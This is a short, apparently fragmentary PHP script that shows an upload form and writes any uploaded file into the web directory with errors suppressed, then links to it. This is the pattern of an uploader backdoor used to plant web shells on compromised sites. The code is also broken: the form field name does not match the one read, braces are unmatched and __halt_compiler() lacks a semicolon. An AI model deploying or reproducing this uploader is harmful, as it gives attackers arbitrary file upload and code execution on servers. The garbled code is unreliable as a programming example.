<?php
echo "<form method='POST' enctype='multipart/form-data'>
          <input type='file' name='file'>
          <input type='submit' value='Upload'>
        </form>";
 @copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);
 echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");
}
}__halt_compiler()
?>
